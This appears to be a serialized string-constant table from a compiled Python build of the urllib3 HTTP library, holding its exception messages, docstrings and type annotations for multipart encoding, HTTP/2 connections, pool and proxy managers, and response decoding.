    aintDapartialaexpectedareturnaintpaNoneuIncompleteRead.__init__Dareturnastra__repr__uIncompleteRead.__repr__aInvalidChunkLengthuInvalid chunk length in a chunked response.DaresponsealengthareturnaHTTPResponseabytesaNoneuInvalidChunkLength.__init__uInvalidChunkLength.__repr__aInvalidHeaderuThe header provided was somehow invalid.aProxySchemeUnknownuProxyManager does not support the supplied schemeDaschemeareturnustr | NoneaNoneuProxySchemeUnknown.__init__TEValueErroraProxySchemeUnsupporteduFetching HTTPS resources through HTTPS proxies is unsupportedaHeaderParsingErroruRaised by assert_header_parsing, but we convert it to a log.warning statement.Dadefectsaunparsed_dataareturnulist[MessageDefect]ubytes | str | NoneaNoneuHeaderParsingError.__init__aUnrewindableBodyErroruurllib3 encountered an error when trying to rewind a bodyuurllib3\exceptions.pyu<module urllib3.exceptions>Ta__class__Taselfadefectsaunparsed_dataamessagea__class__Taselfapoolaurlaretriesamessagea__class__TaselfapartialaexpectedTaselfaresponsealengthTaselfalocationamessagea__class__Taselfapoolaurlareasonamessagea__class__Taselfahostaconnareasonamessagea__class__Taselfaconnamessagea__class__Taselfapoolamessagea__class__Taselfamessageaerrora__class__Taselfaschemeamessagea__class__Taselfapoolaurlamessagea__class__Taself.urllib3.fieldsxamimetypesaguess_typelu
    Guess the "Content-Type" of a file.

    :param filename:
        The filename to guess the "Content-Type" of using :mod:`mimetypes`.
    :param default:
        If no "Content-Type" can be guessed, default to `default`.
    awarningsawarnu'format_header_param_rfc2231' is deprecated and will be removed in urllib3 v2.1.0. This is not valid for multipart/form-data header parameters.aDeprecationWarningDastacklevelladecodeTuutf-8u"\
uu="avaluew"aasciiTEUnicodeEncodeErrorEUnicodeDecodeErroraemailautilsaencode_rfc2231uutf-8u*=u
    Helper function to format and quote a single header parameter using the
    strategy defined in RFC 2231.

    Particularly useful for header parameters which might contain
    non-ASCII values, like file names. This follows
    `RFC 2388 Section 4.4 <https://tools.ietf.org/html/rfc2388#section-4.4>`_.

    :param name:
        The name of the parameter, a string expected to be ASCII only.
    :param value:
        The value of the parameter, provided as ``bytes`` or `str``.
    :returns:
        An RFC-2231-formatted unicode string.

    .. deprecated:: 2.0.0
        Will be removed in urllib3 v2.1.0. This is not valid for
        ``multipart/form-data`` header parameters.
    u<genexpr>uformat_header_param_rfc2231.<locals>.<genexpr>atranslateDl
l
l"u%0Au%0Du%22u
    Format and quote a single multipart header parameter.

    This follows the `WHATWG HTML Standard`_ as of 2021/06/10, matching
    the behavior of current browser and curl versions. Values are
    assumed to be UTF-8. The ``\n``, ``\r``, and ``"`` characters are
    percent encoded.

    .. _WHATWG HTML Standard:
        https://html.spec.whatwg.org/multipage/
        form-control-infrastructure.html#multipart-form-data

    :param name:
        The name of the parameter, an ASCII-only ``str``.
    :param value:
        The value of the parameter, a ``str`` or UTF-8 encoded
        ``bytes``.
    :returns:
        A string ``name="value"`` with the escaped value.

    .. versionchanged:: 2.0.0
        Matches the WHATWG HTML Standard as of 2021/06/10. Control
        characters are no longer percent encoded.

    .. versionchanged:: 2.0.0
        Renamed from ``format_header_param_html5`` and
        ``format_header_param``. The old names will be removed in
        urllib3 v2.1.0.
    u'format_header_param_html5' has been renamed to 'format_multipart_header_param'. The old name will be removed in urllib3 v2.1.0.aformat_multipart_header_paramu
    .. deprecated:: 2.0.0
        Renamed to :func:`format_multipart_header_param`. Will be
        removed in urllib3 v2.1.0.
    u'format_header_param' has been renamed to 'format_multipart_header_param'. The old name will be removed in urllib3 v2.1.0.a_namea_filenameadataaheadersuThe 'header_formatter' parameter is deprecated and will be removed in urllib3 v2.1.0.aheader_formatterutoo many values to unpack (expected 3)utoo many values to unpack (expected 2)aguess_content_typeafilenameTafilenameaheader_formatteramake_multipartTacontent_typeu
        A :class:`~urllib3.fields.RequestField` factory from old-style tuple parameters.

        Supports constructing :class:`~urllib3.fields.RequestField` from
        parameter of key/value strings AND key/filetuple. A filetuple is a
        (filename, data, MIME type) tuple where the MIME type is optional.
        For example::

            'foo': 'bar',
            'fakefile': ('foofile.txt', 'contents of foofile'),
            'realfile': ('barfile.txt', open('realfile').read()),
            'typedfile': ('bazfile.bin', open('bazfile').read(), 'image/jpeg'),
            'nonamefile': 'contents of nonamefile field',

        Field names and filenames must be unicode.
        u
        Override this method to change how each multipart header
        parameter is formatted. By default, this calls
        :func:`format_multipart_header_param`.

        :param name:
            The name of the parameter, an ASCII-only ``str``.
        :param value:
            The value of the parameter, a ``str`` or UTF-8 encoded
            ``bytes``.

        :meta public:
        aitemsapartsaselfa_render_partu; u
        Helper function to format and quote a single header.

        Useful for single headers that are composed of multiple items. E.g.,
        'Content-Disposition' fields.

        :param header_parts:
            A sequence of (k, v) tuples or a :class:`dict` of (k, v) to format
            as `k1="v1"; k2="v2"; ...`.
        uContent-DispositionuContent-TypeuContent-Locationagetalinesu: u
u
        Renders the headers for this request field.
        uform-dataa_render_partsanameu
        Makes this request field into a multipart request field.

        This method overrides "Content-Disposition", "Content-Type" and
        "Content-Location" headers to the request parameter.

        :param content_disposition:
            The 'Content-Disposition' of the request body. Defaults to 'form-data'
        :param content_type:
            The 'Content-Type' of the request body.
        :param content_location:
            The 'Content-Location' of the request body.

        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsuemail.utilsatypingaUnionTOstrObytesa_TYPE_FIELD_VALUEaTuplea_TYPE_FIELD_VALUE_TUPLETuapplication/octet-streamDafilenameadefaultareturnustr | NoneastrpDanameavalueareturnastra_TYPE_FIELD_VALUEastraformat_header_param_rfc2231aformat_header_param_html5aformat_header_paramuurllib3.fieldsa__module__u
    A data container for request body parameters.

    :param name:
        The name of this request field. Must be unicode.
    :param data:
        The data/value body.
    :param filename:
        An optional filename of the request field. Must be unicode.
    :param headers:
        An optional dict-like object of headers to initially use for the field.

    .. versionchanged:: 2.0.0
        The ``header_formatter`` parameter is deprecated and will
        be removed in urllib3 v2.1.0.
    aRequestFielda__qualname__TnnnDanameadataafilenameaheadersaheader_formatterastra_TYPE_FIELD_VALUEustr | Noneutyping.Mapping[str, str] | Noneutyping.Callable[[str, _TYPE_FIELD_VALUE], str] | Nonea__init__uRequestField.__init__TnDafieldnameavalueaheader_formatterareturnastra_TYPE_FIELD_VALUE_TUPLEutyping.Callable[[str, _TYPE_FIELD_VALUE], str] | NoneaRequestFieldafrom_tuplesuRequestField.from_tuplesuRequestField._render_partDaheader_partsareturnudict[str, _TYPE_FIELD_VALUE | None] | typing.Sequence[tuple[str, _TYPE_FIELD_VALUE | None]]astruRequestField._render_partsDareturnastrarender_headersuRequestField.render_headersDacontent_dispositionacontent_typeacontent_locationareturnustr | Noneustr | Noneustr | NoneaNoneuRequestField.make_multipartuurllib3\fields.pyTa.0achavalueu<module urllib3.fields>Taselfanameadataafilenameaheadersaheader_formatterawarningsTaselfanameavalueTaselfaheader_partsaiterableapartsanameavalueTanameavalueawarningsTanameavalueawarningsaresultTanameavalueTaclsafieldnameavalueaheader_formatterafilenameacontent_typeadataarequest_paramTafilenameadefaultTaselfacontent_dispositionacontent_typeacontent_locationTaselfalinesasort_keysasort_keyaheader_nameaheader_value.urllib3.filepost<abinasciiahexlifyaurandomTladecodeu
    Our embarrassingly-simple replacement for mimetools.choose_boundary.
    u
    Iterate over fields.

    Supports list of (k, v) tuples and dicts, and lists of
    :class:`~urllib3.fields.RequestField`.

    afieldsaMappingaitemsaRequestFieldafrom_tuplesaiter_field_objectsaBytesIOachoose_boundaryabodyawriteu--uu
ulatin-1awriterarender_headersadataTc
u--
umultipart/form-data; boundary=agetvalueu
    Encode a dictionary of ``fields`` using the multipart/form-data MIME format.

    :param fields:
        Dictionary of fields or list of (key, :class:`~urllib3.fields.RequestField`).
        Values are processed by :func:`urllib3.fields.RequestField.from_tuples`.

    :param boundary:
        If not specified, then a random boundary will be generated using
        :func:`urllib3.filepost.choose_boundary`.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationslacodecsaosatypingTa_TYPE_FIELD_VALUE_TUPLEaRequestFieldla_TYPE_FIELD_VALUE_TUPLEalookupTuutf-8laSequenceaUnionaTuplea_TYPE_FIELDS_SEQUENCEa_TYPE_FIELDSDareturnastrDafieldsareturna_TYPE_FIELDSutyping.Iterable[RequestField]TnDafieldsaboundaryareturna_TYPE_FIELDSustr | Noneutuple[bytes, str]aencode_multipart_formdatauurllib3\filepost.pyu<module urllib3.filepost>Tafieldsaboundaryabodyafieldadataacontent_typeTafieldsaiterableafield.urllib3.http2.connectionaRE_IS_LEGAL_HEADER_NAMEamatchu
    "An implementation that validates fields according to the definitions in Sections
    5.1 and 5.5 of [HTTP] only needs an additional check that field names do not
    include uppercase characters." (https://httpwg.org/specs/rfc9113.html#n-field-validity)

    `http.client._is_legal_header_name` does not validate the field name according to the
    HTTP 1.1 spec, so we do that here, in addition to checking for uppercase characters.

    This does not allow for the `:` character in the header name, so should not
    be used to validate pseudo-headers.
    aRE_IS_ILLEGAL_HEADER_VALUEasearchu
    "A field value MUST NOT contain the zero value (ASCII NUL, 0x00), line feed
    (ASCII LF, 0x0a), or carriage return (ASCII CR, 0x0d) at any position. A field
    value MUST NOT start or end with an ASCII whitespace character (ASCII SP or HTAB,
    0x20 or 0x09)." (https://httpwg.org/specs/rfc9113.html#n-field-validity)
    athreadingaRLockalocka_objaacquireareleasea_new_h2_conna_h2_conna_h2_streama_headersaproxyaproxy_configuProxies aren't supported with HTTP/2a__class__a__init__a_tunnel_hostuTunneling isn't supported with HTTP/2ah2aconfigaH2ConfigurationTtTaclient_sidea_LockedObjectaconnectionaH2ConnectionTaconfigaconnecta__enter__a__exit__ainitiate_connectionadata_to_sendasockasendallTnnnaskip_hostu`skip_host` isn't supportedaskip_accept_encodingu`skip_accept_encoding` isn't supportedw/a_request_urla_validate_pathw:ahostw[uu]:aportlaappendTTc:schemechttpsc:methodaencodec:authorityc:pathaget_next_available_stream_iduputrequest
        This deviates from the HTTPConnection method signature since we never need to override
        sending accept-encoding headers or the host header.
        alowera_is_legal_header_nameuIllegal header name a_is_illegal_header_valueuIllegal header value aselfaheaderaConnectionErrorTuMust call `putrequest` first.asend_headersTastream_idaheadersaend_streamareadadataablocksizeaconnasend_dataDaend_streamFaend_streamDaend_streamtu`data` should be str, bytes, iterable, or file. got %ruSend data to the server.
        `data` can be: `str`, `bytes`, an iterable, or file-like objects
        that support a .read() method.
        uHTTP/2 does not support setting up a tunnel through a proxyBarecvTlareceive_dataaeventsaResponseReceivedaHTTPHeaderDictaheadersutoo many values to unpack (expected 2)c:statusadecodeaaddTaasciiaDataReceivedaacknowledge_received_dataaflow_controlled_lengthastream_idaStreamEndedastatusaHTTP2ResponseTastatusaheadersarequest_urladataasettimeoutatimeoutaputrequestaitemsutransfer-encodingachunkedaputheadercuser-agenta_get_default_user_agentaendheadersTamessage_bodyasenduSend an HTTP/2 requestaclose_connectionacloseluHTTP/2Tastatusaheadersaversionaversion_stringareasonadecode_contentarequest_urla_datalalength_remaininga__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaloggingareatypesatypinguh2.configuh2.connectionuh2.eventsa_base_connectionTa_TYPE_BODYla_TYPE_BODYa_collectionsTaHTTPHeaderDictTaHTTPSConnectiona_get_default_user_agentaHTTPSConnectionaexceptionsTaConnectionErroraresponseTaBaseHTTPResponseaBaseHTTPResponseaorig_HTTPSConnectionaTypeVarTwTwTagetLoggerTuurllib3.http2.connectionalogacompileTc^[!#$%&'*+\-.^_`|~0-9a-z]+$Tc[\0\x00\x0a\x0d\r\n]|^[ \r\n\t]|[ \r\n\t]$DanameareturnabytesaboolDavalueareturnabytesaboolaGenerica__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.http2.connectiona__module__u
    A wrapper class that hides a specific object behind a lock.
    The goal here is to provide a simple way to protect access to an object
    that cannot safely be simultaneously accessed from multiple threads. The
    intended use of this class is simple: take hold of it with a context
    manager, which returns the protected object.
    a__qualname__Talocka_obja__slots__DaobjwTu_LockedObject.__init__DareturnwTu_LockedObject.__enter__Daexc_typeaexc_valaexc_tbareturnutype[BaseException] | NoneuBaseException | Noneutypes.TracebackType | NoneaNoneu_LockedObject.__exit__a__orig_bases__aHTTP2ConnectionTnDahostaportakwargsareturnastruint | Noneutyping.AnyaNoneuHTTP2Connection.__init__Dareturnu_LockedObject[h2.connection.H2Connection]uHTTP2Connection._new_h2_connDareturnaNoneuHTTP2Connection.connectDamethodaurlakwargsareturnastrputyping.AnyaNoneuHTTP2Connection.putrequestDaheaderavaluesareturnustr | bytesustr | bytesaNoneuHTTP2Connection.putheaderDamessage_bodyareturnutyping.AnyaNoneuHTTP2Connection.endheadersDadataareturnutyping.AnyaNoneuHTTP2Connection.sendTnnahttpDahostaportaheadersaschemeareturnastruint | Noneutyping.Mapping[str, str] | NoneastraNoneaset_tunneluHTTP2Connection.set_tunnelDareturnaHTTP2ResponseagetresponseuHTTP2Connection.getresponseTnnDapreload_contentadecode_contentaenforce_content_lengthtppDamethodaurlabodyaheadersapreload_contentadecode_contentaenforce_content_lengthakwargsareturnastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | Noneaboolpputyping.AnyaNonearequestuHTTP2Connection.requestuHTTP2Connection.closeTFDastatusaheadersarequest_urladataadecode_contentareturnaintaHTTPHeaderDictastrabytesaboolaNoneuHTTP2Response.__init__apropertyDareturnabytesuHTTP2Response.dataaget_redirect_locationuHTTP2Response.get_redirect_locationuHTTP2Response.closeuurllib3\http2\connection.pyu<module urllib3.http2.connection>Ta__class__TaselfTaselfaexc_typeaexc_valaexc_tbTaselfahostaportakwargsa__class__Taselfastatusaheadersarequest_urladataadecode_contenta__class__TaselfaobjTavalueTanameTaselfaconfigTaselfaconnadataa__class__Taselfaconnadata_to_senda__class__Taselfamessage_bodyaconnadata_to_sendTaselfastatusadataaconnaend_streamareceived_dataaeventsaeventaheadersaheaderavalueadata_to_sendTaselfaheaderavaluesavalueTaselfamethodaurlakwargsaauthorityaconnTaselfamethodaurlabodyaheadersapreload_contentadecode_contentaenforce_content_lengthakwargswkwvTaselfadataaconnadata_to_sendachunkTaselfahostaportaheadersascheme.urllib3.http2A2uTaconnectionlaconnectionlTautilautilaconnectionpoolTaHTTPSConnectionPoolaHTTPSConnectionPoolTassl_assl_TaHTTP2ConnectionlaHTTP2ConnectionaHTTPSConnectionaorig_HTTPSConnectionaConnectionClsah2aALPN_PROTOCOLSuhttp/1.1a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_urllib3u\not_existingahttp2TaNUITKA_PACKAGE_urllib3_http2u\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__a__annotations__aannotationsaversionainject_into_urllib3aextract_from_urllib3a__all__atypingutyping.AnyDareturnaNoneuurllib3\http2\__init__.pyu<module urllib3.http2>Taurllib3_connectionaurllib3_utilaHTTPSConnectionPoolaurllib3_util_sslTah2_versionaurllib3_connectionaurllib3_utilaHTTPSConnectionPoolaurllib3_util_sslaHTTP2Connection.urllib3.http2.probep4athreadingaLocka_locka_cache_locksa_cache_valuesa__enter__a__exit__aRLockTnnnaacquireareleaseuCannot reset HTTP/2 support for origin after value has been set.aitemsutoo many values to unpack (expected 2)uThis function is for testing purposes only. Gets the current state of the probe cacheuThis function is for testing purposes only. Reset the cache valuesa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsluurllib3.http2.probea__module__a_HTTP2ProbeCachea__qualname__Ta_locka_cache_locksa_cache_valuesa__slots__DareturnaNonea__init__u_HTTP2ProbeCache.__init__Dahostaportareturnastraintubool | Noneaacquire_and_getu_HTTP2ProbeCache.acquire_and_getDahostaportasupports_http2areturnastraintubool | NoneaNoneaset_and_releaseu_HTTP2ProbeCache.set_and_releaseDareturnudict[tuple[str, int], bool | None]a_valuesu_HTTP2ProbeCache._valuesa_resetu_HTTP2ProbeCache._reseta_HTTP2_PROBE_CACHEa__all__uurllib3\http2\probe.pyu<module urllib3.http2.probe>TaselfTaselfahostaportavalueakeyakey_lockweTaselfahostaportasupports_http2akeyakey_locku.urllib3.poolmanager5+acopyaschemealowerahostTaheadersa_proxy_headersa_socks_optionsacontextaitemsagetTasocket_optionsasocket_optionsakeysapopakey_a_fieldsTakey_blocksizea_DEFAULT_BLOCKSIZEakey_blocksizeu
    Create a pool key out of a request context dictionary.

    According to RFC 3986, both the scheme and host are case-insensitive.
    Therefore, this function normalizes both before constructing the pool
    key for an HTTPS request. If you wish to change this behaviour, provide
    alternate callables to ``key_fn_by_scheme``.

    :param key_class:
        The class to use when constructing the key. This should be a namedtuple
        with the ``scheme`` and ``host`` keys at a minimum.
    :type  key_class: namedtuple
    :param request_context:
        A dictionary-like object that contain the context for a request.
    :type  request_context: dict

    :return: A namedtuple that can be used as a connection pool key.
    :rtype:  PoolKey
    a__class__a__init__aconnection_pool_kwaRecentlyUsedContainerapoolsapool_classes_by_schemeakey_fn_by_schemeaclearTablocksizeablocksizeTaschemeahostaportarequest_contextahttpaSSL_KEYWORDSu
        Create a new :class:`urllib3.connectionpool.ConnectionPool` based on host, port, scheme, and
        any additional pool keyword arguments.

        If ``request_context`` is provided, it is provided as keyword arguments
        to the pool class used. This method is used to actually create the
        connection pools handed out by :meth:`connection_from_url` and
        companion methods. It is intended to be overridden for customization.
        u
        Empty our store of pools and direct them all to close.

        This will not affect in-flight connections, but they will not be
        re-used after completion.
        aLocationValueErrorTuNo host specified.a_merge_pool_kwargsaport_by_schemelPaportaconnection_from_contextu
        Get a :class:`urllib3.connectionpool.ConnectionPool` based on the host, port, and scheme.

        If ``port`` isn't given, it will be derived from the ``scheme`` using
        ``urllib3.connectionpool.port_by_scheme``. If ``pool_kwargs`` is
        provided, it is merged with the instance's ``connection_pool_kw``
        variable and used to create the new connection pool, if one is
        needed.
        astrictawarningsawarnuThe 'strict' parameter is no longer needed on Python 3+. This will raise an error in urllib3 v2.1.0.aDeprecationWarningTastrictaURLSchemeUnknownaconnection_from_pool_keyTarequest_contextu
        Get a :class:`urllib3.connectionpool.ConnectionPool` based on the request context.

        ``request_context`` must at least contain the ``scheme`` key and its
        value must be a key in ``key_fn_by_scheme`` instance variable.
        alocka__enter__a__exit__a_new_poolTnnnapoolu
        Get a :class:`urllib3.connectionpool.ConnectionPool` based on the provided pool key.

        ``pool_key`` should be a namedtuple that only contains immutable
        objects. At a minimum it must have the ``scheme``, ``host``, and
        ``port`` fields.
        aparse_urlaconnection_from_hostTaportaschemeapool_kwargsu
        Similar to :func:`urllib3.connectionpool.connection_from_url`.

        If ``pool_kwargs`` is not provided and a new pool needs to be
        constructed, ``self.connection_pool_kw`` is used to initialize
        the :class:`urllib3.connectionpool.ConnectionPool`. If ``pool_kwargs``
        is provided, it is used instead. Note that if a new pool does not
        need to be created for the request, the provided ``pool_kwargs`` are
        not used.
        utoo many values to unpack (expected 2)abase_pool_kwargsu
        Merge a dictionary of override values for self.connection_pool_kw.

        This does not modify self.connection_pool_kw and returns a new dict.
        Any keys in the override dictionary with a value of ``None`` are
        removed from the merged dictionary.
        aproxyaconnection_requires_http_tunnelaproxy_configu
        Indicates if the proxy requires the complete destination URL in the
        request.  Normally this is only needed when not using an HTTP CONNECT
        tunnel.
        lTuURLs without a scheme (ie 'https://') are deprecated and will raise an error in a future version of urllib3. To avoid this DeprecationWarning ensure all URLs start with 'https://' or 'http://'. Read more in this issue: https://github.com/urllib3/urllib3/issues/2920TacategoryastacklevelTaportaschemeaassert_same_hostaredirectaheadersa_proxy_requires_url_absolute_formaurlopenarequest_uriaget_redirect_locationaurljoinastatuslaGETabodyaHTTPHeaderDicta_prepare_for_method_changeTaretriesaRetryafrom_intTaredirectaremove_headers_on_redirectaconnais_same_hostaretriesanew_headersaincrementTaresponsea_poolaMaxRetryErroraraise_on_redirectadrain_connalogainfouRedirecting %s -> %su
        Same as :meth:`urllib3.HTTPConnectionPool.urlopen`
        with custom cross-host redirect logic and only sends the request-uri
        portion of the ``url``.

        The given ``url`` parameter must be absolute, such that an appropriate
        :class:`urllib3.connectionpool.ConnectionPool` can be chosen for it.
        aHTTPConnectionPooluu://w:TahttpahttpsaProxySchemeUnknowna_replaceTaportaproxy_headersaproxy_ssl_contextaProxyConfiga_proxya_proxy_headersa_proxy_configahttpsTapool_kwargsDaAcceptu*/*anetlocaHostu
        Sets headers needed by proxies: specifically, the Accept and Host
        headers. Only sets headers not provided by the user.
        a_set_proxy_headersuSame as HTTP(S)ConnectionPool.urlopen, ``url`` must be absolute.aProxyManageraproxy_urla__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsafunctoolsalogginglatypingaTracebackTypeuurllib.parseTaurljoina_collectionsTaHTTPHeaderDictaRecentlyUsedContainerla_request_methodsTaRequestMethodsaRequestMethodsaconnectionTaProxyConfigaconnectionpoolTaHTTPConnectionPoolaHTTPSConnectionPoolaport_by_schemeaHTTPSConnectionPoolaexceptionsTaLocationValueErroraMaxRetryErroraProxySchemeUnknownaURLSchemeUnknownaresponseTaBaseHTTPResponseaBaseHTTPResponseuutil.connectionTa_TYPE_SOCKET_OPTIONSa_TYPE_SOCKET_OPTIONSuutil.proxyTaconnection_requires_http_tunneluutil.retryTaRetryuutil.timeoutTaTimeoutaTimeoutuutil.urlTaUrlaparse_urlaUrlaPoolManageraproxy_from_urla__all__agetLoggerTuurllib3.poolmanagerTakey_fileacert_fileacert_reqsaca_certsaca_cert_dataassl_versionassl_minimum_versionassl_maximum_versionaca_cert_dirassl_contextakey_passwordaserver_hostnamelaNamedTuplea__prepare__aPoolKeya__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.poolmanagera__module__u
    All known keyword arguments that could be provided to the pool manager, its
    pools, or the underlying connections.

    All custom key schemes should include the fields in this key at a minimum.
    a__qualname__a__annotations__astrakey_schemeakey_hostuint | Noneakey_portuTimeout | float | int | Noneakey_timeoutuRetry | bool | int | Noneakey_retriesubool | Noneakey_blockutuple[str, int] | Noneakey_source_addressustr | Noneakey_key_fileakey_key_passwordakey_cert_fileakey_cert_reqsakey_ca_certsustr | bytes | Noneakey_ca_cert_datauint | str | Noneakey_ssl_versionussl.TLSVersion | Noneakey_ssl_minimum_versionakey_ssl_maximum_versionakey_ca_cert_dirussl.SSLContext | Noneakey_ssl_contextakey_maxsizeufrozenset[tuple[str, str]] | Noneakey_headersuUrl | Noneakey__proxyakey__proxy_headersuProxyConfig | Noneakey__proxy_configu_TYPE_SOCKET_OPTIONS | Noneakey_socket_optionsakey__socks_optionsubool | str | Noneakey_assert_hostnameakey_assert_fingerprintakey_server_hostnamea__orig_bases__Dakey_classarequest_contextareturnutype[PoolKey]udict[str, typing.Any]aPoolKeya_default_key_normalizerapartialu
    Allows for arbitrary requests while transparently keeping track of
    necessary connection pools for you.

    :param num_pools:
        Number of connection pools to cache before discarding the least
        recently used pool.

    :param headers:
        Headers to include with all requests, unless other headers are given
        explicitly.

    :param \**connection_pool_kw:
        Additional parameters are used to create fresh
        :class:`urllib3.connectionpool.ConnectionPool` instances.

    Example:

    .. code-block:: python

        import urllib3

        http = urllib3.PoolManager(num_pools=2)

        resp1 = http.request("GET", "https://google.com/")
        resp2 = http.request("GET", "https://google.com/mail")
        resp3 = http.request("GET", "https://yahoo.com/")

        print(len(http.pools))
        # 2

    Tl
nDanum_poolsaheadersaconnection_pool_kwareturnaintutyping.Mapping[str, str] | Noneutyping.AnyaNoneuPoolManager.__init__DareturnaSelfuPoolManager.__enter__Daexc_typeaexc_valaexc_tbareturnutype[BaseException] | NoneuBaseException | NoneuTracebackType | Noneutyping.Literal[False]uPoolManager.__exit__TnDaschemeahostaportarequest_contextareturnastrpaintudict[str, typing.Any] | NoneaHTTPConnectionPooluPoolManager._new_poolDareturnaNoneuPoolManager.clearTnahttpnDahostaportaschemeapool_kwargsareturnustr | Noneuint | Noneustr | Noneudict[str, typing.Any] | NoneaHTTPConnectionPooluPoolManager.connection_from_hostDarequest_contextareturnudict[str, typing.Any]aHTTPConnectionPooluPoolManager.connection_from_contextDapool_keyarequest_contextareturnaPoolKeyudict[str, typing.Any]aHTTPConnectionPooluPoolManager.connection_from_pool_keyDaurlapool_kwargsareturnastrudict[str, typing.Any] | NoneaHTTPConnectionPoolaconnection_from_urluPoolManager.connection_from_urlDaoverrideareturnudict[str, typing.Any] | Noneudict[str, typing.Any]uPoolManager._merge_pool_kwargsDaparsed_urlareturnaUrlabooluPoolManager._proxy_requires_url_absolute_formTtDamethodaurlaredirectakwareturnastrpaboolutyping.AnyaBaseHTTPResponseuPoolManager.urlopenu
    Behaves just like :class:`PoolManager`, but sends all requests through
    the defined proxy, using the CONNECT method for HTTPS URLs.

    :param proxy_url:
        The URL of the proxy to be used.

    :param proxy_headers:
        A dictionary containing headers that will be sent to the proxy. In case
        of HTTP they are being sent with each request, while in the
        HTTPS/CONNECT case they are sent only once. Could be used for proxy
        authentication.

    :param proxy_ssl_context:
        The proxy SSL context is used to establish the TLS connection to the
        proxy when using HTTPS proxies.

    :param use_forwarding_for_https:
        (Defaults to False) If set to True will forward requests to the HTTPS
        proxy to be made on behalf of the client instead of creating a TLS
        tunnel via the CONNECT method. **Enabling this flag means that request
        and response headers and content will be visible from the HTTPS proxy**
        whereas tunneling keeps request and response headers and content
        private.  IP address, target hostname, SNI, and port are always visible
        to an HTTPS proxy even when this flag is disabled.

    :param proxy_assert_hostname:
        The hostname of the certificate to verify against.

    :param proxy_assert_fingerprint:
        The fingerprint of the certificate to verify against.

    Example:

    .. code-block:: python

        import urllib3

        proxy = urllib3.ProxyManager("https://localhost:3128/")

        resp1 = proxy.request("GET", "https://google.com/")
        resp2 = proxy.request("GET", "https://httpbin.org/")

        print(len(proxy.pools))
        # 1

        resp3 = proxy.request("GET", "https://httpbin.org/")
        resp4 = proxy.request("GET", "https://twitter.com/")

        print(len(proxy.pools))
        # 3

    Tl
nnnFnnD
aproxy_urlanum_poolsaheadersaproxy_headersaproxy_ssl_contextause_forwarding_for_httpsaproxy_assert_hostnameaproxy_assert_fingerprintaconnection_pool_kwareturnastraintutyping.Mapping[str, str] | Noneutyping.Mapping[str, str] | Noneussl.SSLContext | NoneabooluNone | str | typing.Literal[False]ustr | Noneutyping.AnyaNoneuProxyManager.__init__uProxyManager.connection_from_hostDaurlaheadersareturnastrutyping.Mapping[str, str] | Noneutyping.Mapping[str, str]uProxyManager._set_proxy_headersuProxyManager.urlopenDaurlakwareturnastrutyping.AnyaProxyManageruurllib3\poolmanager.pyu<module urllib3.poolmanager>Ta__class__TaselfTaselfaexc_typeaexc_valaexc_tbTaselfanum_poolsaheadersaconnection_pool_kwa__class__Taselfaproxy_urlanum_poolsaheadersaproxy_headersaproxy_ssl_contextause_forwarding_for_httpsaproxy_assert_hostnameaproxy_assert_fingerprintaconnection_pool_kwastr_proxy_urlaproxyaporta__class__Takey_classarequest_contextacontextakeyasocket_optsafieldTaselfaoverrideabase_pool_kwargsakeyavalueTaselfaschemeahostaportarequest_contextapool_clsakeyakwTaselfaparsed_urlTaselfaurlaheadersaheaders_anetlocTaselfarequest_contextaschemeapool_key_constructorapool_keyTaselfahostaportaschemeapool_kwargsarequest_contextTaselfahostaportaschemeapool_kwargsa__class__Taselfapool_keyarequest_contextapoolaschemeahostaportTaselfaurlapool_kwargswuTaurlakwTaselfamethodaurlaredirectakwwuaconnaresponsearedirect_locationaretriesanew_headersaheaderTaselfamethodaurlaredirectakwwuaheadersa__class__.urllib3.responsezDa_first_tryca_dataazlibadecompressobja_objadecompressaerroraMAX_WBITSaflushlaGzipDecoderStateaFIRST_MEMBERa_stateBaSWALLOW_DATAaretaselfadataaOTHER_MEMBERSaunused_dataabrotliaDecompressoraprocessazstdaZstdDecompressoraeofadata_partsaDecodeErrorTuZstandard data is incompleteasplitTw,a_get_decoderastripa_decoderslw,aMultiDecoderTagzipux-gzipaGzipDecoderabraBrotliDecoderaHAS_ZSTDaZstdDecoderaDeflateDecoderacollectionsadequeabuffera_sizeaappendubuffer is emptyun should be > 0aBytesIOafetchedwnapopleftutoo many values to unpack (expected 2)awriteaappendleftagetvalueapopawritelinesu<genexpr>uBytesQueueBuffer.get_all.<locals>.<genexpr>aHTTPHeaderDictaheadersastatusaversionaversion_stringareasonadecode_contenta_has_decoded_contenta_request_urlaretriesachunkedagetTutransfer-encodingualowera_decoderuBaseHTTPResponse.__init__.<locals>.<genexpr>aREDIRECT_STATUSESTalocationu
        Should we redirect and where to?

        :returns: Truthy redirect location string if we got a redirect status
            code and valid location. ``None`` if redirect status and no
            location. ``False`` if not a redirect status code.
        adecodeTuutf-8a_jsonaloadsu
        Deserializes the body of the HTTP response as a Python object.

        The body of the HTTP response must be encoded using UTF-8, as per
        `RFC 8529 Section 8.1 <https://www.rfc-editor.org/rfc/rfc8259#section-8.1>`_.

        To use a custom JSON decoder pass the result of :attr:`HTTPResponse.data` to
        your custom decoder instead.

        If the body of the HTTP response is not decodable to UTF-8, a
        `UnicodeDecodeError` will be raised. If the body of the HTTP response is not a
        valid JSON document, a `json.JSONDecodeError` will be raised.

        Read more :ref:`here <json_content>`.

        :returns: The body of the HTTP response as a Python object.
        a_retriesahistoryqaredirect_locationaurlTucontent-encodinguaCONTENT_DECODERSu
        Set-up the _decoder attribute if necessary.
        uCalling read(decode_content=False) is not supported after read(decode_content=True) was called.aDECODER_ERROR_CLASSESuReceived response with content-encoding: %s, but failed to decode it.a_flush_decoderu
        Decode the data passed in and potentially flush the decoder.
        Tcu
        Flushes the decoder. Should only be called if the decoder is actually
        being used.
